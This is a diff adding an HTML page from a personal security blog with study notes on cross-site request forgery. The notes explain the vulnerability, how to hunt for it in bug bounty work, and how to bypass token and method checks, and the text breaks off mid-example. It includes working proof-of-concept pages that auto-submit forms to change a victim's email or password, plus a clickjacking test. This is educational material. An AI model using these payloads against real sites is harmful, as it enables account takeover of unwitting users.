@@ -1,0 +1,577 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Cross-site Request Forgery // 0xSlaxo Blog</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.101.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Abdelrhman Allam" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://sl4x0.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Cross-site Request Forgery"/>
+<meta name="twitter:description" content="In this section, we&rsquo;ll explain what cross-site request forgery is, describe some examples of common CSRF vulnerabilities, and explain how to prevent CSRF attacks.
+Cross-site request forgery Refrences AllAboutBugBounty/Cross Site Request Forgery.md at master · daffainfo/AllAboutBugBounty
+HowToHunt/CSRF at master · KathanP19/HowToHunt
+GitHub - alexbieber/Bug_Bounty_writeups: BUG BOUNTY WRITEUPS - OWASP TOP 10 🔴🔴🔴🔴✔
+CSRF (Cross Site Request Forgery)
+PHP CSRF Guard
+Cross Site Request Forgery - Pastebin.com
+Jay M. on LinkedIn: CSRF"/>
+
+    <meta property="og:title" content="Cross-site Request Forgery" />
+<meta property="og:description" content="In this section, we&rsquo;ll explain what cross-site request forgery is, describe some examples of common CSRF vulnerabilities, and explain how to prevent CSRF attacks.
+Cross-site request forgery Refrences AllAboutBugBounty/Cross Site Request Forgery.md at master · daffainfo/AllAboutBugBounty
+HowToHunt/CSRF at master · KathanP19/HowToHunt
+GitHub - alexbieber/Bug_Bounty_writeups: BUG BOUNTY WRITEUPS - OWASP TOP 10 🔴🔴🔴🔴✔
+CSRF (Cross Site Request Forgery)
+PHP CSRF Guard
+Cross Site Request Forgery - Pastebin.com
+Jay M. on LinkedIn: CSRF" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sl4x0.github.io/web-notes/csrf/" /><meta property="article:section" content="web-notes" />
+<meta property="article:published_time" content="2022-07-19T23:48:05+00:00" />
+<meta property="article:modified_time" content="2022-07-19T23:48:05+00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://sl4x0.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Abdelrhman Allam" /></a>
+      <h1>0xSlaxo Blog</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/about/">About</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/">Home</a>
+             | 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p> M.A.C.S Student | N00b CTFer</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.facebook.com/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
+  <title>My facebook</title>
+  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>My Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://linkedin.com/in/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>My Twitter</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Cross-site Request Forgery</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 19, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          15 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://sl4x0.github.io/tags/csrf/">CSRF</a>
+              <a class="tag" href="https://sl4x0.github.io/tags/web-notes/">Web-Notes</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>In this section, we&rsquo;ll explain what cross-site request forgery is, describe some examples of common CSRF vulnerabilities, and explain how to prevent CSRF attacks.</p>
+<h1 id="cross-site-request-forgery"><strong>Cross-site request forgery</strong></h1>
+<h1 id="refrences"><code>Refrences</code></h1>
+<p><a href="https://github.com/daffainfo/AllAboutBugBounty/blob/master/Cross%20Site%20Request%20Forgery.md">AllAboutBugBounty/Cross Site Request Forgery.md at master · daffainfo/AllAboutBugBounty</a></p>
+<p><a href="https://github.com/KathanP19/HowToHunt/tree/master/CSRF">HowToHunt/CSRF at master · KathanP19/HowToHunt</a></p>
+<p><a href="https://github.com/alexbieber/Bug_Bounty_writeups#cross-site-request-forgery-csrf">GitHub - alexbieber/Bug_Bounty_writeups: BUG BOUNTY WRITEUPS - OWASP TOP 10 🔴🔴🔴🔴✔</a></p>
+<p><a href="https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery">CSRF (Cross Site Request Forgery)</a></p>
+<p><a href="https://wiki.owasp.org/index.php/PHP_CSRF_Guard">PHP CSRF Guard</a></p>
+<p><a href="https://pastebin.com/iQFSe6fM">Cross Site Request Forgery - Pastebin.com</a></p>
+<p><a href="https://www.linkedin.com/posts/jay89_csrf-activity-6953934466662678528-SJrf?utm_source=linkedin_share&amp;utm_medium=android_app">Jay M. on LinkedIn: CSRF</a></p>
+<p><a href="https://youtu.be/1xryhTQQ6Qc">Full Account Takeover via CSRF Vulnerability</a></p>
+<p><a href="https://medium.com/bugbountywriteup/lets-bypass-csrf-protection-password-confirmation-to-takeover-victim-accounts-d-4a21297847ff">Let&rsquo;s Bypass CSRF Protection &amp; Password Confirmation to Takeover Victim Accounts :D</a></p>
+<p><a href="https://www.youtube.com/watch?v=roVG7Qgm4hU">What are CSRF Token and how to implement them?</a></p>
+<p><a href="https://portswigger.net/web-security/csrf/samesite-cookies">Defending against CSRF with SameSite cookies</a></p>
+<p><a href="https://www.youtube.com/watch?v=aUF2QCEudPo">SameSite Cookie Attribute Explained by Example (Strict, Lax, None &amp; No SameSite)</a></p>
+<p><a href="https://www.youtube.com/watch?v=zsyU3x7oGH0">شرح ثغرات CSRF واماكن تواجدها</a></p>
+<h2 id="what-is-csrf"><strong>What is CSRF?</strong></h2>
+<p>is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.</p>
+<p>Its partly allow the attacker to spoof the SOP.</p>
+<p><img src="https://user-images.githubusercontent.com/70459751/179423578-f1b76fa0-0d4d-4447-b76a-914d1cef724f.png" alt="image"></p>
+<h2 id="what-is-the-impact-of-csrf"><code>What is the Impact of CSRF?</code></h2>
+<p>For example, this might be to <code>change</code> the email address on their account, to change their password, or to make a funds <code>transfer</code>. Depending on the nature of the action, the attacker might be able to gain <code>full control</code> over the user&rsquo;s account.</p>
+<p>If the user have a <code>privillage</code> role that attacker colud have the <code>full control</code> over the web application.</p>
+<hr>
+<h2 id="how-does-csrf-work"><strong>How does CSRF work?</strong></h2>
+<ul>
+<li><strong>A relevant action.</strong> This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user&rsquo;s own password).</li>
+<li><strong>Cookie-based session handling.</strong> Performming Actions need HTTP requests, And the App trust session cookies to identify the user who has made it. There is no other mechanism in place for tracking sessions or validating user requests.</li>
+<li><strong>No unpredictable request parameters.</strong> The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.</li>
+</ul>
+<hr>
+<h2 id="example">Example</h2>
+<p>Suppose the Application have a funtion that let the user to change his password, the HTTP Request will be like that.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">email</span><span style="color:#f92672">/</span><span style="color:#a6e22e">change</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">vulnerable</span><span style="color:#f92672">-</span><span style="color:#a6e22e">website</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">www</span><span style="color:#f92672">-</span><span style="color:#a6e22e">form</span><span style="color:#f92672">-</span><span style="color:#a6e22e">urlencoded</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session</span><span style="color:#f92672">=</span><span style="color:#a6e22e">yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">email</span><span style="color:#f92672">=</span><span style="color:#a6e22e">wiener</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">normal</span><span style="color:#f92672">-</span><span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">com</span>
+</span></span></code></pre></div><p>That’s meet required For <strong>CSRF Attack</strong></p>
+<ul>
+<li>Attacker will typically be able to trigger a password reset and take full control of the user&rsquo;s account.</li>
+<li>The application take care of user session only there is no other mechanisms to track user sessions</li>
+<li>The attacker can easily determine the values of the request parameters that are needed to perform the action.</li>
+</ul>
+<p>The attacker could make a HTML page to make this attack like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://vulnerable-website.com/email/change&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;email&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pwned@evil-user.net&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">submit</span>();
+</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>And if the user visit this web page:</p>
+<ul>
+<li>The attacker page will triger a HTTP request to the vulnerable website.</li>
+<li>If the user is logged in the vulnerable website, the browser will automaticlly include his session cookies on the reqest.  • (assuming <a href="https://portswigger.net/web-security/csrf/samesite-cookies">SameSite cookies</a> are not being used).</li>
+<li>The vulnerable web site will process the request in the normal way, and BOOM the email will be change.</li>
+</ul>
+<hr>
+<h1 id="hunting-for-csrfs"><code>Hunting for CSRFs</code></h1>
+<p>To look for them, start by discovering <code>state-changing requests</code> that aren’t shielded by CSRF protections. Just always try to test wil <code>FireFox</code></p>
+<h3 id="step-1-spot-state-changing-actions">Step 1: Spot State-Changing Actions</h3>
+<p>For example, <code>sending</code> tweets and <code>modifying</code> user settings are both state-changing.</p>
+<p>Just start sign up and login in the web application and try to discover state changing actions.</p>
+<p>For example, let’s say you’re testing <a href="http://email.example.com/">email.example.com</a>, a subdomain of <a href="http://example.com/">example.com</a> that handles email.</p>
+<p>Go through all the <code>app’s functionalities</code>, clicking all the <code>links</code>. <code>Intercept</code> the generated requests with a proxy like Burp and write down their <code>URL endpoints.</code></p>
+<p><strong>State-changing requests on</strong> <a href="http://email.example.com/">email.example.com</a>
+•Change password: <a href="http://email.example.com/password_change">email.example.com/password_change</a> → POST request
+Request parameters: new_password
+•Send email: <a href="http://email.example.com/send_email">email.example.com/send_email</a> → POST request
+Request parameters: draft_id, recipient_id
+•Delete email: <a href="http://email.example.com/delete_email">email.example.com/delete_email</a> → POST request
+Request parameters: email_id</p>
+<hr>
+<h3 id="step-2-look-for-a-lack-of-csrf-protections">Step 2: Look for a Lack of CSRF Protections</h3>
+<p>Now visit these endpoints to test them for CSRFs. By Intercepting all the requests and check if there is csrf token or any validating methods.</p>
+<p>while you’re actively hunting for CSRFs. Keep clicking the Forward button until you encounter the request associated with the state-changing action.</p>
+<p><strong>For example</strong>, let’s say you’re testing whether the password-change function you discovered is vulnerable to CSRFs. You’ve intercepted the request in your Burp proxy:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">password_change</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">email</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_password</span><span style="color:#f92672">=</span><span style="color:#a6e22e">abc123</span>
+</span></span></code></pre></div><p>Search for any <strong>csrf token</strong> in burpsuite if you found it we will try to talk in bypass techniques for it later</p>
+<hr>
+<h3 id="step-3-confirm-the-vulnerability">Step 3: Confirm the Vulnerability</h3>
+<p>After founding the vulnerability we are able now to make PoC:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://email.example.com/password_change&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrf-form&#34;</span>&gt; <span style="color:#ae81ff">1</span> <span style="color:#75715e">//First we generate a POST request to the vulnerable endpoint
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;new_password&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;abc123&#34;</span>&gt; <span style="color:#ae81ff">2</span> <span style="color:#75715e">// the value that we want to change
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Submit&#34;</span>&gt; <span style="color:#ae81ff">3</span> <span style="color:#75715e">//specifies a Submit button
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">script</span>&gt;document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;csrf-form&#34;</span>).<span style="color:#a6e22e">submit</span>();&lt;/<span style="color:#f92672">script</span>&gt; <span style="color:#ae81ff">4</span> <span style="color:#75715e">//JavaScript code that submits the form 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">automatically</span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>After opening this in our browser this will be the request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">password_change</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">email</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_password</span><span style="color:#f92672">=</span><span style="color:#a6e22e">abc123</span>
+</span></span></code></pre></div><blockquote>
+<p><strong>The goal is to prove that a foreign site can carry out state-changing actions on a user’s behalf.</strong></p>
+</blockquote>
+<hr>
+<h1 id="bypassing-csrf-protection"><code>Bypassing CSRF Protection</code></h1>
+<p>If the protection is incomplete or faulty, you might still be able to achieve a CSRF attack with a few modifications to your payload.</p>
+<hr>
+<h3 id="exploit-clickjacking">Exploit Clickjacking</h3>
+<p><a href="https://www.youtube.com/watch?v=cdswOMjPpDo">Basic clickjacking with CSRF token protection (Video solution)</a></p>
+<p>If the endpoint uses CSRF tokens but the page itself is vulnerable to clickjacking, you can exploit clickjacking to achieve the same results as a CSRF.</p>
+<p>Check a page for clickjacking by using an HTML page like the following one.</p>
+<p>If the page that the state-changing function is located in appears in your iframe, the page is vulnerable to clickjacking:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">title</span>&gt;<span style="color:#a6e22e">Clickjack</span> <span style="color:#a6e22e">test</span> <span style="color:#a6e22e">page</span>&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">p</span>&gt;<span style="color:#a6e22e">This</span> <span style="color:#a6e22e">page</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">vulnerable</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">clickjacking</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">iframe</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">blank</span><span style="color:#f92672">!</span>&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PAGE_URL&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;500&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;500&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><hr>
+<h3 id="change-the-request-method">Change the Request Method</h3>
+<p><a href="https://www.youtube.com/watch?v=Rmpjoq7_tpE">CSRF - Lab #2 CSRF where token validation depends on request method | Short Version</a></p>
+<p>By changing the request method, you might be able to get the action executed without encountering CSRF protection.</p>
+<p>For example, say the POST request of the password-change endpoint is protected by a CSRF token, like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">password_change</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">email</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_password</span><span style="color:#f92672">=</span><span style="color:#a6e22e">abc123</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">csrf_token</span><span style="color:#f92672">=</span><span style="color:#ae81ff">871</span><span style="color:#a6e22e">caef0757a4ac9691aceb9aad8b65b</span>
+</span></span></code></pre></div><p>Just try to change the request to GET and try to remove the token:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">password_change</span><span style="color:#f92672">?</span><span style="color:#a6e22e">new_password</span><span style="color:#f92672">=</span><span style="color:#a6e22e">abc123</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">email</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>
+</span></span></code></pre></div><p>In this case, your malicious HTML page could simply look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://email.example.com/password_change?new_password=abc123&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>The HTML tag loads images from <code>external sources</code>. It will send a GET request to the URL specified in its src attribute. 
+If the password change occurs after you load this HTML page, you can confirm that the endpoint is <code>vulnerable to CSRF via a GET request.</code></p>
+<p>You can change the request method to <code>POST</code> if the original request in GET.</p>
+<hr>
+<h3 id="bypass-csrf-tokens-stored-on-the-server">Bypass CSRF Tokens Stored on the Server</h3>
+<p>Just because a site uses CSRF tokens doesn’t mean it is validating them properly.</p>
+<p>First, try deleting the token parameter or sending a blank token parameter.</p>
+<p>For example, this will send the request without a csrf_token parameter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">password_change</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">email</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_cookie</span><span style="color:#f92672">=</span><span style="color:#a6e22e">YOUR_SESSION_COOKIE</span>
+</span></span><span style="display:flex;"><span>(<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">request</span> <span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">new_password</span><span style="color:#f92672">=</span><span style="color:#a6e22e">abc123</span>
+</span></span></code></pre></div><p>The PoC page will be like that:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://email.example.com/password_change&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrf-form&#34;</span>&gt;
